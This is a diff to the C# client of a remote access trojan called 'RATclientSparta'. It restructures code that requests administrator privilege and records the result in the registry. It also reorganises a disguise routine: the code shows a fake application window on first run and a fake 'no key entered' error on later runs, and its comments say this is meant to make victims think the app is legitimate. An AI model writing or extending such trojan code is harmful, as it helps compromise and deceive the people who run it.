@@ -43,8 +43,6 @@ namespace RATclientSparta
                 //Notice: This program registry path is HKEY_CURRENT_USER\Software\ClientValues
                 //ClientValues - The registry key of this app
 
-                //Class name - GetPrivilege
-                Get app = new Get();
                 //Registry check if item exist
                 RegistryCheck item = new RegistryCheck();
 
@@ -57,6 +55,8 @@ namespace RATclientSparta
 
                     if (!(item.CheckIfExist("HaveAdminPrivilege")))
                     {
+                        //Class name - GetPrivilege
+                        AdminGet app = new AdminGet();
                         if (app.GetAdmin())
                         {
                             RegistryCreate data = new RegistryCreate();
@@ -81,23 +81,24 @@ namespace RATclientSparta
                         RegistryDelete value = new RegistryDelete();
                         value.DeleteValue("HaveAdminPrivilege");
                     }
-                }
 
-                //If "FirstOpen" registry data not exist, its the first time program opened.
-                //the Fake GUI will open, only once in life.
-                if (!(item.CheckIfExist("FirstOpen")))
-                {
-                    //At the first open a GUI box will be shown because i want
-                    //Clients to think this is a legit app
-                    RegistryCreate value = new RegistryCreate();
-                    value.Create("FirstOpen", "0");
-                    GUIApp application = new GUIApp();
-                    new Thread(new ThreadStart(() => { application.ShowDialog(); })).Start();
-                }
-                else
-                {
-                    //User opened the program again, at this point he will keep thinking app is legit. (Fake error message)
-                    MessageBox.Show("Error: please enter the key to use this program." + Environment.NewLine + "Error ID: 45771 (No key entered)");
+
+                    //If "FirstOpen" registry data not exist, its the first time program opened.
+                    //the Fake GUI will open, only once in life.
+                    if (!(item.CheckIfExist("FirstOpen")))
+                    {
+                        //At the first open a GUI box will be shown because i want
+                        //Clients to think this is a legit app
+                        RegistryCreate value = new RegistryCreate();
+                        value.Create("FirstOpen", "0");
+                        GUIApp application = new GUIApp();
+                        new Thread(new ThreadStart(() => { application.ShowDialog(); })).Start();
+                    }
+                    else
+                    {
+                        //User opened the program again, at this point he will keep thinking app is legit. (Fake error message)
+                        MessageBox.Show("Error: please enter the key to use this program." + Environment.NewLine + "Error ID: 45771 (No key entered)");
+                    }
                 }
             }
         }
